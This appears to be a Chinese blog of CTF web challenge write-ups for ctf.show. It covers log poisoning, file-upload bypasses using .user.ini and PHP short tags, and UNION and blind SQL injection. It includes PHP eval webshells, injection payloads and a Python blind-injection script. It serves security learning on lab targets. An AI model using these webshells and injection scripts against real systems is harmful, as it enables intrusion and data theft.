<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>多过滤了data字符，所以data协议被ban了</p>
<p>查看一下中间件</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122002123119.png" alt="image-20211122002123119"></p>
<p>nginx，很常见，可以考虑一波日志包含，一定一定要注意，日志包含尽量一次成功避免污染环境，将User-Agent的value写成POST一句话进行访问nginx的默认日志文件</p>
<p>nginx日志文件默认路径:<code>/var/log/nginx/access.log</code></p>
<p><img src="/../images/CTF-web-2.assets/image-20211122003226613.png" alt="image-20211122003226613"></p>
<p>可以看到命令执行了</p>
<p>接下来直接读flag</p>
<p>这里面，它把flag.php改了个名。。。所以直接用<code>f???.php</code>通配符绕过输出了</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122003442413.png" alt="image-20211122003442413"></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>基础的绕过前端验证</p>
<p>观察脚本发现</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122155918876.png" alt="image-20211122155918876"></p>
<p>在前端验证仅允许上传<code>.png</code>文件，且上传成功会返回路径，这里直接写入POST方式的一句话，更改后缀为.png绕过前端验证，再使用burp抓包将文件更改回.php，最后webshell连接即可。&#x3D;&#x3D;蚁剑最好使用post方式写一句话&#x3D;&#x3D;</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122160101439.png" alt="image-20211122160101439"></p>
<p>有趣的是<code>/tmp/html/flag.php</code>里是一个假的flag</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122160147084.png" alt="image-20211122160147084"></p>
<p>真flag在<code>/var/www/html/flag.php</code>中</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122160350335.png" alt="image-20211122160350335"></p>
<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>方式同上</p>
<p>不过也可以先上传php文件抓包修改<code>content-type:image/png</code></p>
<h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>同样盲测了一堆发现都被限制了</p>
<p>&#x3D;&#x3D;.PhP&#x3D;&#x3D;大小写可绕过上传但是不解析</p>
<p>参考了羽师傅的博客内容，了解了一波php的<code>.user.ini</code>特性</p>
<blockquote>
<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
</blockquote>
<p>也就是里面除了PHP_INI_SYSTEM模式的配置以外都可以在.user.ini中进行重写。<br>那么我们就去找我们需要用到配置<br>发现auto_append_file和auto_prepend_file<br>一个相当于在每个php文件尾加上 include(“xxxx”)，一个相当于文件头加上 include(“xxx”)<br>其中xxx就是 auto_append_file的值。</p>
<p><strong>注意</strong>：&#x3D;&#x3D;此方法仅适用于当前页面有php时&#x3D;&#x3D;</p>
<p>对于此题，因为访问&#x2F;upload页面出现了文字，所以可以判断这里有Index.php文件，所以用此方法即每个php文末都加上了一个文件包含</p>
<p>首先我们新建一个<code>user.ini</code>文件，里面写入<code>auto_append_file=shell.txt</code></p>
<p>后续抓包将<code>user.ini</code>更改为<code>.user.ini</code>，先进行上传，直接修改前端验证代码上传（这里因为脚本未限制）所以可以直接上传</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122163840665.png" alt="image-20211122163840665"></p>
<p><img src="/../images/CTF-web-2.assets/image-20211122163947837.png" alt="image-20211122163947837"></p>
<p>修改为以上内容，再抓包更改Content-Type内容为	<code>image/png</code>使其成功上传，<code>.user.ini</code>会返回上传路径</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122164119004.png" alt="image-20211122164119004"></p>
<p>再写入一个shell.txt的一句话进行上传</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122164445330.png" alt="image-20211122164445330"></p>
<p>访问&#x2F;upload(相当于访问&#x2F;upload&#x2F;index.php，且此php文件包含了一个shell.txt)，传一个post参数即可发现RCE了</p>
<p><img src="/../images/CTF-web-2.assets/image-20211122164610563.png" alt="image-20211122164610563"></p>
<p><img src="/../images/CTF-web-2.assets/image-20211122164657798.png" alt="image-20211122164657798"></p>
<p>payload:<code>1=system(&quot;cat ../fl*&quot;);</code>再右键查看源码&#x3D;&#x3D;注意得先回到上级目录&#x3D;&#x3D;</p>
<p>payload:<code>1=system(&quot;tac ../fl*&quot;);</code>直接输出到当前页面</p>
<h3 id="web154、155"><a href="#web154、155" class="headerlink" title="web154、155"></a>web154、155</h3><p>过滤&lt;xphp的特定标签</p>
<p>尝试使用短标签绕过<br>对于php的标签其他写法，介绍几种<br>1、</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>前提是开启配置参数short_open_tags&#x3D;on</p>
<p>2、</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不需要开启参数设置</p>
<p>3、</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;</span><br></pre></td></tr></table></figure>

<p>前提是开启配置参数asp_tags&#x3D;on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。<br>4、</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=”php”&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>不需要修改参数开关，但是只能在7.0以下可用。</p>
<h2 id="Web（非入门）"><a href="#Web（非入门）" class="headerlink" title="Web（非入门）"></a>Web（非入门）</h2><blockquote>
<p>To myself:</p>
<p>​	保研结束，寒假期间，努力复检&amp;提升</p>
</blockquote>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>一个sql注入，F12页面无任何信息</p>
<p><img src="/../images/CTF-web-2.assets/image-20230108223305104.png" alt="image-20230108223305104"></p>
<p><strong>懒人思路</strong>：bp保存请求头为web.txt文件，使用sqlmap一把梭</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r web2.txt --dbs</span><br><span class="line">sqlmap -r web2.txt -D web2 --tables</span><br><span class="line">sqlmap -r web2.txt -D web2 -T flag --columns</span><br><span class="line">sqlmap -r web2.txt -D web2 -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;注意&#x3D;&#x3D;：新版sqlmap只需要sqlmap + [options]即可</p>
<p><img src="/../images/CTF-web-2.assets/image-20230108223709229.png" alt="image-20230108223709229"></p>
<p><img src="/../images/CTF-web-2.assets/image-20230108225436790.png" alt="image-20230108225436790"></p>
<p><strong>手注</strong>：</p>
<p><img src="/../images/CTF-web-2.assets/image-20230108231429836.png" alt="image-20230108231429836"></p>
<p>可以看到，基本是完全没有进行过滤，使用admin账号登录成功，基本确定存在sql注入点</p>
<p>接下来就是看回显字段</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>

<p>可以发现，当测试到3个的时候会有回显，在第二个字段有回显</p>
<p><img src="/../images/CTF-web-2.assets/image-20230108233036063.png" alt="image-20230108233036063"></p>
<p>构造查询，列出所有表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230108235350739.png" alt="image-20230108235350739"></p>
<p>再查询字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=`flag`#</span></span><br></pre></td></tr></table></figure>

<p>最后出结果</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,flag,3 from flag#</span></span><br></pre></td></tr></table></figure>

<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p><img src="/../images/CTF-web-2.assets/image-20230109004628854.png" alt="image-20230109004628854"></p>
<p>include文件包含，基本就确定用php伪协议，php:&#x2F;&#x2F;flitter可以读取文件，但是目前我们不知道有什么文件。参考php:&#x2F;&#x2F;input这个协议，构造get传参的url，再用bp添加POST内容，为PHP代码</p>
<p><img src="/../images/CTF-web-2.assets/image-20230109004614468.png" alt="image-20230109004614468"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到有两个文件:<code>ctf_go_go_go</code>和<code>index.php</code></p>
<p>接下来用flitter读也可，用input继续post读也行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://31fc5775-0fb5-402f-82be-f3609ca88617.challenge.ctf.show/?url=php://filter/read=convert.base64-encode/resource=ctf_go_go_go</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230109005358767.png" alt="image-20230109005358767"></p>
<p><img src="/../images/CTF-web-2.assets/image-20230109005414625.png" alt="image-20230109005414625"></p>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>页面和web3一样，但是推测对url参数做了过滤，ban了php字符</p>
<p><img src="/../images/CTF-web-2.assets/image-20230111232629440.png" alt="image-20230111232629440"></p>
<p>当传入就会发现返回error，因此所有伪协议都无法使用，转变思路，因为include会文件包含，所以自然想到另一个思路，日志传马，查看其web中间件和系统组件可以看到，操作系统是Ubuntu</p>
<p><img src="/../images/CTF-web-2.assets/image-20230111232838863.png" alt="image-20230111232838863"></p>
<p>nginx的日志文件路径为</p>
<p><code>/var/log/nginx/</code>，其中包括access.log和error.log</p>
<p><img src="/../images/CTF-web-2.assets/image-20230111233920524.png" alt="image-20230111233920524"></p>
<p>将UA写入一句话木马传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来再用蚁剑或者其他连接工具连接即可，连接地址为<code>http://314901b1-452b-4957-8e75-62121eba06cf.challenge.ctf.show/?url=/var/log/nginx/access.log</code></p>
<p><img src="/../images/CTF-web-2.assets/image-20230111234320020.png" alt="image-20230111234320020"></p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><img src="/../images/CTF-web-2.assets/image-20230111235507513.png" alt="image-20230111235507513"></p>
<p>检测两个GET参数，当v1输入为字母，v2输入为数字，他俩的MD5值一样，才会输出flag</p>
<p>简单的php弱类型，0e开头的数字会被认为是科学计数法，所以构造payload即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://74582c38-b2bd-435a-a0e5-d74f2c088a61.challenge.ctf.show/?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230111235706795.png" alt="image-20230111235706795"></p>
<p>存几个弱类型，详细见此文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">链接地址</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2=240610708&amp;v1=EEIZDOI</span><br></pre></td></tr></table></figure>

<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>sql注入，但是ban了空格，换成<code>/**/</code>即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1# //报错了</span><br><span class="line">admin‘/**/or/**/1=1# //成功了</span><br><span class="line">/开始~~</span><br><span class="line">admin&#x27;/**/or/**/1=1/**/order/**/by/**/3#</span><br><span class="line">admin&#x27;/**/or/**/1=1/**/union/**/select/**/1,2,3#</span><br><span class="line">admin&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br><span class="line">admin&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;flag&quot;#</span><br><span class="line">admin&#x27;/**/or/**/1=1/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></pre></td></tr></table></figure>

<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p><img src="/../images/CTF-web-2.assets/image-20230112011841991.png" alt="image-20230112011841991"></p>
<p>输入id&#x3D;-1无返回，输入id&#x3D;-1||-1有返回，可以确定这是一个整形注入，区别于字符注入</p>
<p>所以我们需要一位一位的比较，判断有无返回来确定，即盲注，利用脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://27e9c68c-05fd-422d-81dc-400e82686fd7.challenge.ctf.show/index.php?id=-1&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">url</span>):					<span class="comment">#爆库名</span></span><br><span class="line">    database=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">            u= <span class="string">&quot;||/**/ascii(substr(database()/**/,/**/&#123;0&#125;/**/,/**/1))=&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            s = url+u</span><br><span class="line">            r =  requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                database+=<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>(<span class="params">url</span>):					<span class="comment">#爆表名</span></span><br><span class="line">    table=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">            u=<span class="string">&quot;||ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            s = url+u</span><br><span class="line">            r =  requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                table+=<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(table)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column</span>(<span class="params">url</span>):					<span class="comment">#爆字段</span></span><br><span class="line">    column=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">            u=<span class="string">&quot;||ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=\&quot;flag\&quot;),&#123;0&#125;,1))=&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            s = url+u</span><br><span class="line">            r =  requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                column+=<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(column)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">url</span>):					<span class="comment">#爆flag</span></span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">            u=<span class="string">&quot;||ascii(substr((select/**/flag/**/from/**/flag),&#123;0&#125;,1))=&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            s = url+u</span><br><span class="line">            r =  requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#db(url)</span></span><br><span class="line">    <span class="comment">#table(url)</span></span><br><span class="line">    <span class="comment">#column(url)</span></span><br><span class="line">    flag(url)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230112012351293.png" alt="image-20230112012351293"></p>
<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>同上题目环境以及思路，不同的是ban了<code>,</code>号，相应修改为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u= <span class="string">&quot;||/**/ascii(substr(database()/**/,/**/&#123;0&#125;/**/,/**/1))=&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br></pre></td></tr></table></figure>

<p>该句修改为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u= <span class="string">&quot;||/**/ascii(substr(database()/**/from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br></pre></td></tr></table></figure>

<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>还是一个登录页面，但是试了一下常规sql注入，没有回显，F12源码也没有任何信息，所以回到最初信息收集阶段，使用御剑和dirsearch扫描后台，可以发现一个<code>robots.txt</code>的配置文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u xxx -e*</span><br></pre></td></tr></table></figure>



<p><img src="/../images/CTF-web-2.assets/image-20230112215017676.png" alt="image-20230112215017676"></p>
<p>访问发现，其存在<code>index.phps</code>文件，可以下载</p>
<p><img src="/../images/CTF-web-2.assets/image-20230112215054174.png" alt="image-20230112215054174"></p>
<p>打开后可以发现其对应的sql查询语句</p>
<p><img src="/../images/CTF-web-2.assets/image-20230112215158645.png" alt="image-20230112215158645"></p>
<p>要求我们输入的密码长度不能超过10，再然后需要构造闭合，即<code>&quot;.md5($password,true).&quot;</code>需要生成</p>
<p><code>&#39;or&#39;xxx</code>的形式，才能构造闭合查询这个sql语句</p>
<blockquote>
<p>对于函数md5(string,raw)<br>第二个参数有以下可选项：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数<br>所以只要md5加密后的16进制转化为二进制时有 ‘or’xxxx，即可构成闭合语句： username &#x3D;’admin’ and password &#x3D;‘ ’or ‘xxxxx’ 成功登陆</p>
</blockquote>
<p>符合条件的有两个字符串，因长度限制输入第一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure>

<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p><img src="/../images/CTF-web-2.assets/image-20230112224114134.png" alt="image-20230112224114134"></p>
<p>同登录框页面，同index.phps文件，里面的内容如上</p>
<p>ban了一堆语句，同时因为后面检测替换前后字符长度，所以无法双写绕过。不会做，参考羽神的博客</p>
<p>绝了，给跪了，鬼才</p>
<p>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br>不加group by时的输出如下：<br><img src="/../images/CTF-web-2.assets/image-20230112224457328.png" alt="image-20230112224457328"><br>在使用group by以后会按照password中的值进行排列：<br><img src="/../images/CTF-web-2.assets/image-20230112224507333.png" alt="image-20230112224507333"><br>②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>来看实例：<br><img src="/../images/CTF-web-2.assets/image-20230112224530938.png" alt="image-20230112224530938"></p>
<p>结果中将会多出一行，其中password列为null，count（*）为统计和。<br>这里我们就可以通过骚姿势绕过了。<br>其中<code>/**/</code>是为了绕过空格过滤<br><code>payload:username=admin&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code><br>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL=&#x3D;NULL)即可满足$password&#x3D;&#x3D;$row[‘password’]的限制成功登陆。<br>另一种payload:<code>&#39;or/**/1=1/**/GROUP/**/BY/**/password/**/WITH/**/ROLLUP/**/LIMIT/**/1/**/OFFSET/**/1#</code></p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p><img src="/../images/CTF-web-2.assets/image-20230112230008803.png" alt="image-20230112230008803"></p>
<p>可以看到有个hit，提示get传参cmd，当输入<code>?cmd=phpinfo();</code>发现可以直接rce，那接下来就是利用cmd参数进行探索。使用<code>print_r();</code>函数将结果显示出来，再用glob函数进行搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的函数glob();glob()函数返回匹配指定模式的文件名或目录</span><br><span class="line">glob(&quot;&quot;)匹配任意文件</span><br><span class="line">glob(&quot;.txt&quot;)匹配以txt后缀的文件</span><br></pre></td></tr></table></figure>



<p><img src="/../images/CTF-web-2.assets/image-20230112231313623.png" alt="image-20230112231313623"></p>
<p>再用<code>highlight_file();</code>函数将文件高亮显示</p>
<p>payload:<code>?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</code></p>
<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>该题明显为文件上传，测试后发现php后缀无法上传，大文本量的内容也会error，测试为空文本时可以成功上传，发现upload.php.bak文件可下载</p>
<p><img src="/../images/CTF-web-2.assets/image-20230112235621512.png" alt="image-20230112235621512"></p>
<p>文件内容不能大于24字节，文件名不能超过9字符，且不能出现php后缀</p>
<p>这里1.txt中写入一句话木马（不能是最短马&lt;?&#x3D;`$_GET[1]&#96;;），我们用短标签构造</p>
<p>补充，<a target="_blank" rel="noopener" href="https://secvery.com/2105.html#:~:text=%E9%A6%96%E5%85%88%EF%BC%8C%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%BA%E4%B8%80%E5%8F%A5%E8%AF%9D%20%E6%9C%A8%E9%A9%AC%20%EF%BC%8C%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84%E5%BD%A2%E5%BC%8F%E4%B8%BA%EF%BC%9A%20%3C%3Fphp%20%40eval%28%24_POST%20%5B%27hacker%27%5D%29%3B%20%3F%3E%20%3C%3Fphp,eval%2Fassert%20%E7%AD%89%E8%83%BD%E5%A4%9F%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BAphp%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%B0%86%20%24_POST%20%2F%20%24_REQUEST%20%2F%20%24_GET%20%E4%B8%AD%E4%BC%A0%E9%80%92%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BAPHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">一句话马</a></p>
<p><code>&lt;?=eval($_POST[&quot;a&quot;]);</code>，上传成功，但是其不是php，无法被解析成命令，接下来上传<code>.user.ini</code>文件（&#x3D;&#x3D;以前写过这个知识点！&#x3D;&#x3D;）需要开启一个配置，其中内嵌<code>auto_prepend_file =1.txt</code>，将会在所有的文件中都加入1.txt的内容，这是便可以rce了，连接蚁剑发现测试连接正常但是无法查看文件，所以使用老方法</p>
